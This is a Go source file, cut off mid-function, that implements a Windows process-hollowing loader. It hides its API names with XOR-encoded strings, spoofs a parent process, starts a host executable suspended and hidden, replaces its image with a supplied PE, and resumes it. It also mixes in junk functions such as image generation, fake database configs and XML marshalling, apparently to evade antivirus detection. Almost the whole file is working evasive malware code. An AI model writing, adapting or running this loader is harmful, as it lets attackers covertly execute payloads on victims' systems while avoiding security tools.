package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io/ioutil"
	"log"
	"math"
	"math/rand/v2"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"text/template"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_RELEASE                          = 0x00008000
	MEM_COMMIT                           = 0x00001000
	MEM_RESERVE                          = 0x00002000
	PAGE_EXECUTE                         = 0x00000010
	PAGE_NOACCESS                        = 0x00000001
	CONTEXT_INTEGER                      = (0x000100000 | 0x000000002)
	CREATE_NO_WINDOW                     = 0x08000000
	CREATE_SUSPENDED                     = 0x00000004
	IMAGE_SCN_MEM_READ                   = 0x40000000
	IMAGE_SCN_MEM_WRITE                  = 0x80000000
	IMAGE_SCN_MEM_EXECUTE                = 0x20000000
	IMAGE_FILE_RELOCS_STRIPPED           = 0x0001
	IMAGE_SUBSYSTEM_WINDOWS_GUI          = 2
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
)

type FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

type CONTEXT struct {
	ContextFlags      uint32
	Dr0               uint32
	Dr1               uint32
	Dr2               uint32
	Dr3               uint32
	Dr6               uint32
	Dr7               uint32
	FloatSave         FLOATING_SAVE_AREA
	SegGs             uint32
	SegFs             uint32
	SegEs             uint32
	SegDs             uint32
	Edi               uint32
	Esi               uint32
	Ebx               uint32
	Edx               uint32
	Ecx               uint32
	Eax               uint32
	Ebp               uint32
	Eip               uint32
	SegCs             uint32
	EFlags            uint32
	Esp               uint32
	SegSs             uint32
	ExtendedRegisters [512]byte
}

type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  uintptr
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}

type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute uintptr
	cbSize    uintptr
	lpValue   uintptr
}

type STARTUPINFOEX struct {
	StartupInfo     syscall.StartupInfo
	lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

func ZeroTrace(hexStr string) string {
	key := byte(0x41)
	decoded, _ := hex.DecodeString(hexStr)
	result := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		result[i] = decoded[i] ^ key
	}
	return string(result)
}

var (
	ntdllHex    = "2f35252d2d6f252d2d"
	kernel32Hex = "2a24332f242d72736f252d2d"

	NtResumeThreadHex                    = "0f35132432342c24152933242025"
	VirtualAllocExHex                    = "1728333534202d002d2d2e220439"
	NtGetContextThreadHex                = "0f35062435022e2f35243935152933242025"
	NtSetContextThreadHex                = "0f35122435022e2f35243935152933242025"
	NtReadVirtualMemoryHex               = "0f35132420251728333534202d0c242c2e3338"
	NtUnmapViewOfSectionHex              = "0f35142f2c2031172824360e2712242235282e2f"
	NtWriteVirtualMemoryHex              = "0f3516332835241728333534202d0c242c2e3338"
	NtProtectVirtualMemoryHex            = "0f3511332e352422351728333534202d0c242c2e3338"
	InitializeProcThreadAttributeListHex = "082f283528202d283b2411332e221529332420250035353328233435240d283235"
	UpdateProcThreadAttributeHex         = "14312520352411332e22152933242025003535332823343524"
	DeleteProcThreadAttributeListHex     = "05242d24352411332e221529332420250035353328233435240d283235"
	GetProcessHeapHex                    = "06243511332e2224323209242031"
	HeapAllocHex                         = "09242031002d2d2e22"
	HeapFreeHex                          = "0924203107332424"

	ntdll    = syscall.NewLazyDLL(ZeroTrace(ntdllHex))
	kernel32 = syscall.NewLazyDLL(ZeroTrace(kernel32Hex))

	pNtResumeThread         = ntdll.NewProc(ZeroTrace(NtResumeThreadHex))
	pVirtualAllocEx         = kernel32.NewProc(ZeroTrace(VirtualAllocExHex))
	pNtGetContextThread     = ntdll.NewProc(ZeroTrace(NtGetContextThreadHex))
	pNtSetContextThread     = ntdll.NewProc(ZeroTrace(NtSetContextThreadHex))
	pNtReadVirtualMemory    = ntdll.NewProc(ZeroTrace(NtReadVirtualMemoryHex))
	pNtUnmapViewOfSection   = ntdll.NewProc(ZeroTrace(NtUnmapViewOfSectionHex))
	pNtWriteVirtualMemory   = ntdll.NewProc(ZeroTrace(NtWriteVirtualMemoryHex))
	pNtProtectVirtualMemory = ntdll.NewProc(ZeroTrace(NtProtectVirtualMemoryHex))

	procInitializeProcThreadAttributeList = kernel32.NewProc(ZeroTrace(InitializeProcThreadAttributeListHex))
	procUpdateProcThreadAttribute         = kernel32.NewProc(ZeroTrace(UpdateProcThreadAttributeHex))
	procDeleteProcThreadAttributeList     = kernel32.NewProc(ZeroTrace(DeleteProcThreadAttributeListHex))
	procGetProcessHeap                    = kernel32.NewProc(ZeroTrace(GetProcessHeapHex))
	procHeapAlloc                         = kernel32.NewProc(ZeroTrace(HeapAllocHex))
	procHeapFree                          = kernel32.NewProc(ZeroTrace(HeapFreeHex))
)

type Process struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func Processes() ([]Process, error) {
	var processes []Process

	var processIDs [1024]uint32
	var bytesReturned uint32
	if err := windows.EnumProcesses(processIDs[:], &bytesReturned); err != nil {
		return nil, err
	}

	numProcesses := bytesReturned / 4

	for i := uint32(0); i < numProcesses; i++ {
		processID := int(processIDs[i])
		if processID == 0 {
			continue
		}

		process, err := GetProcessInfo(processID)
		if err != nil {
			continue
		}

		processes = append(processes, process)
	}

	return processes, nil
}

func GetProcessInfo(pid int) (Process, error) {
	var process Process
	process.ProcessID = pid

	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return process, err
	}
	defer windows.CloseHandle(handle)

	// Get the process executable name
	var exePath [windows.MAX_PATH]uint16
	if err := windows.GetModuleFileNameEx(handle, 0, &exePath[0], windows.MAX_PATH); err != nil {
		return process, err
	}
	process.Exe = windows.UTF16ToString(exePath[:])

	return process, nil
}

func FindProcessByName(processes []Process, name string) *Process {
	for i, p := range processes {
		if extractProcessName(p.Exe) == name {
			return &processes[i]
		}
	}
	return nil
}

func extractProcessName(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '\\' || path[i] == '/' {
			return path[i+1:]
		}
	}
	return path
}

func InitializeProcThreadAttributeList(lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST, dwAttributeCount uint32, dwFlags uint32, lpSize *uintptr) (err error) {
	r1, _, e1 := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(lpAttributeList)),
		uintptr(dwAttributeCount),
		uintptr(dwFlags),
		uintptr(unsafe.Pointer(lpSize)),
	)
	if r1 == 0 {
		if e1 != syscall.Errno(0) {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func UpdateProcThreadAttribute(lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST, dwFlags uint32, Attribute uintptr, lpValue *uintptr, cbSize uintptr, lpPreviousValue uintptr, lpReturnSize *uintptr) (err error) {
	r1, _, e1 := procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(lpAttributeList)),
		uintptr(dwFlags),
		uintptr(Attribute),
		uintptr(unsafe.Pointer(lpValue)),
		uintptr(cbSize),
		uintptr(lpPreviousValue),
		uintptr(unsafe.Pointer(lpReturnSize)),
	)
	if r1 == 0 {
		if e1 != syscall.Errno(0) {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func DeleteProcThreadAttributeList(lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST) {
	procDeleteProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(lpAttributeList)),
	)
}

func GetProcessHeap() (uintptr, error) {
	r1, _, e1 := procGetProcessHeap.Call()
	if r1 == 0 {
		if e1 != syscall.Errno(0) {
			return 0, error(e1)
		} else {
			return 0, syscall.EINVAL
		}
	}
	return r1, nil
}

func HeapAlloc(hHeap uintptr, dwFlags uint32, dwBytes uintptr) (uintptr, error) {
	r1, _, e1 := procHeapAlloc.Call(
		uintptr(hHeap),
		uintptr(dwFlags),
		uintptr(dwBytes),
	)
	if r1 == 0 {
		if e1 != syscall.Errno(0) {
			return 0, error(e1)
		} else {
			return 0, syscall.EINVAL
		}
	}
	return r1, nil
}

func HeapFree(hHeap uintptr, dwFlags uint32, lpMem uintptr) error {
	r1, _, e1 := procHeapFree.Call(
		uintptr(hHeap),
		uintptr(dwFlags),
		uintptr(lpMem),
	)
	if r1 == 0 {
		if e1 != syscall.Errno(0) {
			return error(e1)
		} else {
			return syscall.EINVAL
		}
	}
	return nil
}

const (
	PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY                                     = 0x20007
	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON   = 0x100000000000
	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
)

func imageJunk() {
	width, height := 100, 100
	img := image.NewRGBA(image.Rect(0, 0, width, height))

	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			r := uint8((x * y) % 256)
			g := uint8((x + y) % 256)
			b := uint8((x ^ y) % 256)
			img.Set(x, y, color.RGBA{r, g, b, 255})
		}
	}

	var buf bytes.Buffer
	_ = png.Encode(&buf, img)
	_ = buf.Bytes()
}

// Concurrency with mutexes
func concurrencyJunk() {
	var mu sync.Mutex
	counter := 0

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			for j := 0; j < 100; j++ {
				mu.Lock()
				counter++
				mu.Unlock()

				time.Sleep(time.Microsecond)
			}
		}(i)
	}

	wg.Wait()
	_ = counter
}
func databaseJunk() {
	// This simulates database setup code but never actually connects
	type DBConfig struct {
		Host     string
		Port     int
		User     string
		Password string
		DBName   string
		SSLMode  string
	}

	configs := []DBConfig{
		{
			Host:     "localhost",
			Port:     5432,
			User:     "admin",
			Password: "password123",
			DBName:   "mydb",
			SSLMode:  "disable",
		},
		{
			Host:     "192.168.1.100",
			Port:     3306,
			User:     "root",
			Password: "rootpassword",
			DBName:   "users",
			SSLMode:  "prefer",
		},
	}

	for _, cfg := range configs {
		// Postgres connection string (but never connects)
		pgConnStr := fmt.Sprintf(
			"host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
			cfg.Host, cfg.Port, cfg.User, cfg.Password, cfg.DBName, cfg.SSLMode,
		)

		// MySQL connection string (but never connects)
		mysqlConnStr := fmt.Sprintf(
			"%s:%s@tcp(%s:%d)/%s",
			cfg.User, cfg.Password, cfg.Host, cfg.Port, cfg.DBName,
		)

		// Just store them but never use them
		_ = pgConnStr
		_ = mysqlConnStr
	}
}
func LoadPE(szHostExe string, lpPeContent []byte, parentProcessName string) (bool, *syscall.ProcessInformation) {
	concurrencyJunk()
	processes, err := Processes()
	if err != nil {
		return false, nil
	}

	parentProcess := FindProcessByName(processes, parentProcessName)
	if parentProcess == nil {

		return RunPE(szHostExe, lpPeContent)
	}

	procThreadAttributeSize := uintptr(0)
	InitializeProcThreadAttributeList(nil, 1, 0, &procThreadAttributeSize)

	procHeap, err := GetProcessHeap()
	if err != nil {
		return false, nil
	}

	attributeList, err := HeapAlloc(procHeap, 0, procThreadAttributeSize)
	if err != nil {
		return false, nil
	}
	defer HeapFree(procHeap, 0, attributeList)

	var siex STARTUPINFOEX
	siex.lpAttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))

	err = InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &procThreadAttributeSize)
	if err != nil {
		return false, nil
	}
	defer DeleteProcThreadAttributeList(siex.lpAttributeList)

	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(parentProcess.ProcessID))
	if err != nil {
		return false, nil
	}
	defer windows.CloseHandle(parentHandle)

	uintParentHandle := uintptr(parentHandle)
	err = UpdateProcThreadAttribute(
		siex.lpAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&uintParentHandle,
		unsafe.Sizeof(parentHandle),
		0,
		nil,
	)
	if err != nil {
		return false, nil
	}
	imageJunk()
	szHostExe_UTF16, _ := syscall.UTF16PtrFromString(szHostExe)
	var pi syscall.ProcessInformation

	siex.StartupInfo.Cb = uint32(unsafe.Sizeof(siex))

	err = syscall.CreateProcess(
		szHostExe_UTF16,
		nil,
		nil,
		nil,
		false,
		uint32(CREATE_SUSPENDED|CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT),
		nil,
		nil,
		&siex.StartupInfo,
		&pi,
	)
	if err != nil {
		return false, nil
	}

	defer syscall.CloseHandle(pi.Thread)
	defer syscall.CloseHandle(pi.Process)

	var hProcess uintptr = uintptr(pi.Process)
	var hThread uintptr = uintptr(pi.Thread)

	lpSectionHeader, lpSectionHeaderError := pe.NewFile(
		bytes.NewReader(lpPeContent),
	)
	if lpSectionHeaderError != nil {
		return false, &pi
	}
	databaseJunk()
	var lpSectionHeaderArray []*pe.Section = lpSectionHeader.Sections
	var lpNtHeaderOptionalHeader = lpSectionHeader.OptionalHeader.(*pe.OptionalHeader32)
	var lpPreferableBase uint32 = uint32(lpNtHeaderOptionalHeader.ImageBase)

	var ThreadContext CONTEXT
	ThreadContext.ContextFlags = CONTEXT_INTEGER
	pNtGetContextThreadResult, _, _ := pNtGetContextThread.Call(
		hThread, uintptr(unsafe.Pointer(&ThreadContext)))
	if pNtGetContextThreadResult != 0 {
		return false, &pi
	}

	var lpPebImageBase uint32 = uint32(ThreadContext.Ebx + 8)
	var stReadBytes uint32
	var lpOriginalImageBase uint32
	var dwOriginalImageBase []byte = make([]byte, 4)

	pNtReadVirtualMemoryResult, _, _ := pNtReadVirtualMemory.Call(
		uintptr(hProcess), uintptr(lpPebImageBase),
		uintptr(unsafe.Pointer(&dwOriginalImageBase[0])), uintptr(uint32(4)),
		uintptr(unsafe.Pointer(&stReadBytes)),
	)
	if pNtReadVirtualMemoryResult != 0 {
		return false, &pi
	}

	lpOriginalImageBase = binary.LittleEndian.Uint32(dwOriginalImageBase)
	if lpOriginalImageBase == lpPreferableBase {
		pNtUnmapViewOfSectionResult, _, _ := pNtUnmapViewOfSection.Call(
			hProcess,
			uintptr(lpOriginalImageBase),
		)
		if pNtUnmapViewOfSectionResult == 1 {
			return false, &pi
		}
	}

	var lpAllocatedBase uintptr
	pVirtualAllocExResult, _, _ := pVirtualAllocEx.Call(
		hProcess, uintptr(lpPreferableBase),
		uintptr(lpNtHeaderOptionalHeader.SizeOfImage),
		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(syscall.PAGE_EXECUTE_READWRITE),
	)

	if pVirtualAllocExResult == 0 {
		pVirtualAllocExResult, _, _ := pVirtualAllocEx.Call(
			hProcess, uintptr(0),
			uintptr(lpNtHeaderOptionalHeader.SizeOfImage),
			uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(syscall.PAGE_EXECUTE_READWRITE))
		if pVirtualAllocExResult == 0 {
			return false, &pi
		}
		lpAllocatedBase = pVirtualAllocExResult
	} else {
		lpAllocatedBase = pVirtualAllocExResult
	}
	type Person struct {
		XMLName   xml.Name `xml:"person"`
		ID        int      `xml:"id,attr"`
		FirstName string   `xml:"name>first"`
		LastName  string   `xml:"name>last"`
		Age       int      `xml:"age"`
		Height    float64  `xml:"height"`
		Married   bool     `xml:"married"`
		Address   struct {
			City    string `xml:"city"`
			State   string `xml:"state"`
			Country string `xml:"country"`
			Zip     string `xml:"zip"`
		} `xml:"address"`
	}

	people := []Person{
		{
			ID:        1,
			FirstName: "John",
			LastName:  "Doe",
			Age:       30,
			Height:    5.9,
			Married:   true,
			Address: struct {
				City    string `xml:"city"`
				State   string `xml:"state"`
				Country string `xml:"country"`
				Zip     string `xml:"zip"`
			}{
				City:    "New York",
				State:   "NY",
				Country: "USA",
				Zip:     "10001",
			},
		},
		{
			ID:        2,
			FirstName: "Jane",
			LastName:  "Smith",
			Age:       28,
			Height:    5.5,
			Married:   false,
			Address: struct {
				City    string `xml:"city"`
				State   string `xml:"state"`
				Country string `xml:"country"`
				Zip     string `xml:"zip"`
			}{
				City:    "Los Angeles",
				State:   "CA",
				Country: "USA",
				Zip:     "90001",
			},
		},
	}

	// Marshal to XML
	for _, person := range people {
		xmlData, _ := xml.MarshalIndent(person, "", "  ")

		// Unmarshal back
		var p Person
		xml.Unmarshal(xmlData, &p)
	}
	var stWrittenBytes uintptr
	if lpOriginalImageBase != uint32(lpAllocatedBase) {
		pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
			hProcess,
			uintptr(lpPebImageBase),
			uintptr(unsafe.Pointer(&lpAllocatedBase)),
			uintptr(uint32(4)),
			uintptr(unsafe.Pointer(&stWrittenBytes)),
		)
		if pNtWriteVirtualMemoryResult == 1 {
			return false, &pi
		}
	}

	lpNtHeaderOptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI
	if uint32(lpAllocatedBase) != lpPreferableBase {
		if (lpSectionHeader.FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) > 0 {
			return false, &pi
		} else {
			lpNtHeaderOptionalHeader.ImageBase = uint32(lpAllocatedBase)

		}
	}

	ThreadContext.Eax = uint32(lpAllocatedBase) + lpNtHeaderOptionalHeader.AddressOfEntryPoint
	pNtSetContextThreadResult, _, _ := pNtSetContextThread.Call(hThread, uintptr(unsafe.Pointer(&ThreadContext)))
	if pNtSetContextThreadResult != 0 {
		return false, &pi
	}

	pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
		hProcess,
		lpAllocatedBase,
		uintptr(unsafe.Pointer(&lpPeContent[0])),
		uintptr(lpNtHeaderOptionalHeader.SizeOfHeaders),
		uintptr(unsafe.Pointer(&stWrittenBytes)),
	)
	if pNtWriteVirtualMemoryResult != 0 {
		return false, &pi
	}

	var dwOldProtect uintptr
	pNtProtectVirtualMemoryResult, _, _ := pNtProtectVirtualMemory.Call(
		hProcess,
		lpAllocatedBase,
		uintptr(lpNtHeaderOptionalHeader.SizeOfHeaders),
		syscall.PAGE_READONLY,
		uintptr(unsafe.Pointer(&dwOldProtect)),
	)
	if pNtProtectVirtualMemoryResult == 0 {
		return false, &pi
	}
	const tmplText = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>{{.Title}}</title>
    </head>
    <body>
        <h1>{{.Title}}</h1>
        <ul>
            {{range .Items}}<li>{{.}}</li>{{end}}
        </ul>
        <p>Visit count: {{.Count}}</p>
    </body>
    </html>
    `

	data := struct {
		Title string
		Items []string
		Count int
	}{
		Title: "My Page",
		Items: []string{"Item 1", "Item 2", "Item 3"},
		Count: 42,
	}

	tmpl, _ := template.New("page").Parse(tmplText)
	var buf bytes.Buffer
	tmpl.Execute(&buf, data)
	_ = buf.String()
	for i, Section := range lpSectionHeaderArray {
		SectionPointerToRawData, SectionPointerToRawDataError := Section.Data()
		if SectionPointerToRawDataError != nil {
			return false, &pi
		}

		pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
			hProcess,
			lpAllocatedBase+uintptr(Section.VirtualAddress),
			uintptr(unsafe.Pointer(&SectionPointerToRawData[0])),
			uintptr(Section.Size),
			uintptr(unsafe.Pointer(&stWrittenBytes)),
		)
		if pNtWriteVirtualMemoryResult == 1 {
			return false, &pi
		}

		var dwSectionMappedSize uint32 = 0
		if i == int(lpSectionHeader.FileHeader.NumberOfSections)-1 {
			dwSectionMappedSize = lpNtHeaderOptionalHeader.SizeOfImage - Section.VirtualAddress
		} else {
			dwSectionMappedSize = lpSectionHeaderArray[i+1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress
		}

		var dwSectionProtection uint32 = 0
		if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
			((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) &&
			((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
			dwSectionProtection = syscall.PAGE_EXECUTE_READWRITE
		} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
			((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) {
			dwSectionProtection = syscall.PAGE_EXECUTE_READ
		} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
			((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
			dwSectionProtection = syscall.PAGE_EXECUTE_WRITECOPY
		} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) &&
			((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
			dwSectionProtection = syscall.PAGE_READWRITE
		} else if (Section.Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0 {
			dwSectionProtection = PAGE_EXECUTE
		} else if (Section.Characteristics & IMAGE_SCN_MEM_READ) > 0 {
			dwSectionProtection = syscall.PAGE_READONLY
		} else if (Section.Characteristics & IMAGE_SCN_MEM_WRITE) > 0 {
			dwSectionProtection = syscall.PAGE_WRITECOPY
		} else {
			dwSectionProtection = PAGE_NOACCESS
		}

		pNtProtectVirtualMemoryResult, _, _ := pNtProtectVirtualMemory.Call(
			hProcess,
			lpAllocatedBase+uintptr(Section.VirtualAddress),
			uintptr(dwSectionMappedSize),
			uintptr(dwSectionProtection),
			uintptr(unsafe.Pointer(&dwOldProtect)),
		)
		if pNtProtectVirtualMemoryResult == 0 {
			return false, &pi
		}
	}

	pNtResumeThreadResult, _, _ := pNtResumeThread.Call(uintptr(pi.Thread), uintptr(0))
	if pNtResumeThreadResult != 0 {
		return false, &pi
	}

	return true, &pi
}

func RunPE(szHostExe string, lpPeContent []byte) (bool, *syscall.ProcessInformation) {
	szHostExe_UTF16, _ := syscall.UTF16PtrFromString(szHostExe)
	var si *syscall.StartupInfo = new(syscall.StartupInfo)
	var pi *syscall.ProcessInformation = new(syscall.ProcessInformation)
	si.Cb = uint32(unsafe.Sizeof(&si))
	var pCreateProcessError error = syscall.CreateProcess(
		szHostExe_UTF16, nil, nil, nil, false,
		uint32(CREATE_SUSPENDED|CREATE_NO_WINDOW), nil, nil, si, pi,
	)

	if pCreateProcessError == nil {
		defer syscall.CloseHandle(pi.Thread)
		defer syscall.CloseHandle(pi.Process)
		var hProcess uintptr = uintptr(pi.Process)
		var hThread uintptr = uintptr(pi.Thread)
		lpSectionHeader, lpSectionHeaderError := pe.NewFile(
			bytes.NewReader(lpPeContent),
		)
		if lpSectionHeaderError == nil {
			var lpSectionHeaderArray []*pe.Section = lpSectionHeader.Sections
			var lpNtHeaderOptionalHeader = lpSectionHeader.OptionalHeader.(*pe.OptionalHeader32)
			var lpPreferableBase uint32 = uint32(lpNtHeaderOptionalHeader.ImageBase)
			var ThreadContext CONTEXT
			ThreadContext.ContextFlags = CONTEXT_INTEGER
			pNtGetContextThreadResult, _, _ := pNtGetContextThread.Call(
				hThread, uintptr(unsafe.Pointer(&ThreadContext)))
			if pNtGetContextThreadResult == 0 {
				var lpPebImageBase uint32 = uint32(ThreadContext.Ebx + 8)
				var stReadBytes uint32
				var lpOriginalImageBase uint32
				var dwOriginalImageBase []byte = make([]byte, 4)
				pNtReadVirtualMemoryResult, _, _ := pNtReadVirtualMemory.Call(
					uintptr(hProcess), uintptr(lpPebImageBase),
					uintptr(unsafe.Pointer(&dwOriginalImageBase[0])), uintptr(uint32(4)),
					uintptr(unsafe.Pointer(&stReadBytes)),
				)
				if pNtReadVirtualMemoryResult == 0 {
					lpOriginalImageBase = binary.LittleEndian.Uint32(dwOriginalImageBase)
					if lpOriginalImageBase == lpPreferableBase {
						pNtUnmapViewOfSectionResult, _, _ := pNtUnmapViewOfSection.Call(
							hProcess,
							uintptr(lpOriginalImageBase),
						)
						if pNtUnmapViewOfSectionResult == 1 {
							return false, pi
						}
					}
					var lpAllocatedBase uintptr
					pVirtualAllocExResult, _, _ := pVirtualAllocEx.Call(
						hProcess, uintptr(lpPreferableBase),
						uintptr(lpNtHeaderOptionalHeader.SizeOfImage),
						uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(syscall.PAGE_EXECUTE_READWRITE),
					)
					if pVirtualAllocExResult == 0 {
						pVirtualAllocExResult, _, _ := pVirtualAllocEx.Call(
							hProcess, uintptr(0),
							uintptr(lpNtHeaderOptionalHeader.SizeOfImage),
							uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(syscall.PAGE_EXECUTE_READWRITE))
						if pVirtualAllocExResult == 0 {
							return false, pi
						}
						lpAllocatedBase = pVirtualAllocExResult
					} else {
						lpAllocatedBase = pVirtualAllocExResult
					}
					var stWrittenBytes uintptr
					if lpOriginalImageBase != uint32(lpAllocatedBase) {
						pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
							hProcess,
							uintptr(lpPebImageBase),
							uintptr(unsafe.Pointer(&lpAllocatedBase)),
							uintptr(uint32(4)),
							uintptr(unsafe.Pointer(&stWrittenBytes)),
						)
						if pNtWriteVirtualMemoryResult == 1 {
							return false, pi
						}
					}
					lpNtHeaderOptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI
					if uint32(lpAllocatedBase) != lpPreferableBase {
						if (lpSectionHeader.FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) > 0 {
							return false, pi
						} else {
							lpNtHeaderOptionalHeader.ImageBase = uint32(lpAllocatedBase)

						}
					}
					ThreadContext.Eax = uint32(lpAllocatedBase) + lpNtHeaderOptionalHeader.AddressOfEntryPoint
					pNtSetContextThreadResult, _, _ := pNtSetContextThread.Call(hThread, uintptr(unsafe.Pointer(&ThreadContext)))
					if pNtSetContextThreadResult == 0 {
						pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
							hProcess,
							lpAllocatedBase,
							uintptr(unsafe.Pointer(&lpPeContent[0])),
							uintptr(lpNtHeaderOptionalHeader.SizeOfHeaders),
							uintptr(unsafe.Pointer(&stWrittenBytes)),
						)
						if pNtWriteVirtualMemoryResult == 0 {
							var dwOldProtect uintptr
							pNtProtectVirtualMemoryResult, _, _ := pNtProtectVirtualMemory.Call(
								hProcess,
								lpAllocatedBase,
								uintptr(lpNtHeaderOptionalHeader.SizeOfHeaders),
								syscall.PAGE_READONLY,
								uintptr(unsafe.Pointer(&dwOldProtect)),
							)
							if pNtProtectVirtualMemoryResult != 0 {
								for i, Section := range lpSectionHeaderArray {
									SectionPointerToRawData, SectionPointerToRawDataError := Section.Data()
									if SectionPointerToRawDataError == nil {
										pNtWriteVirtualMemoryResult, _, _ := pNtWriteVirtualMemory.Call(
											hProcess,
											lpAllocatedBase+uintptr(Section.VirtualAddress),
											uintptr(unsafe.Pointer(&SectionPointerToRawData[0])),
											uintptr(Section.Size),
											uintptr(unsafe.Pointer(&stWrittenBytes)),
										)
										if pNtWriteVirtualMemoryResult == 1 {
											return false, pi
										}
										var dwSectionMappedSize uint32 = 0
										if i == int(lpSectionHeader.FileHeader.NumberOfSections)-1 {
											dwSectionMappedSize = lpNtHeaderOptionalHeader.SizeOfImage - Section.VirtualAddress
										} else {
											dwSectionMappedSize = lpSectionHeaderArray[i+1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress
										}
										var dwSectionProtection uint32 = 0
										if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
											dwSectionProtection = syscall.PAGE_EXECUTE_READWRITE
										} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) {
											dwSectionProtection = syscall.PAGE_EXECUTE_READ
										} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
											dwSectionProtection = syscall.PAGE_EXECUTE_WRITECOPY
										} else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) > 0) &&
											((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) > 0) {
											dwSectionProtection = syscall.PAGE_READWRITE
										} else if (Section.Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0 {
											dwSectionProtection = PAGE_EXECUTE
										} else if (Section.Characteristics & IMAGE_SCN_MEM_READ) > 0 {
											dwSectionProtection = syscall.PAGE_READONLY
										} else if (Section.Characteristics & IMAGE_SCN_MEM_WRITE) > 0 {
											dwSectionProtection = syscall.PAGE_WRITECOPY
										} else {
											dwSectionProtection = PAGE_NOACCESS
										}
										pNtProtectVirtualMemoryResult, _, _ := pNtProtectVirtualMemory.Call(
											hProcess,
											lpAllocatedBase+uintptr(Section.VirtualAddress),
											uintptr(dwSectionMappedSize),
											uintptr(dwSectionProtection),
											uintptr(unsafe.Pointer(&dwOldProtect)),
										)
										if pNtProtectVirtualMemoryResult == 0 {
											return false, pi
										}
									} else {
										return false, pi
									}
								}
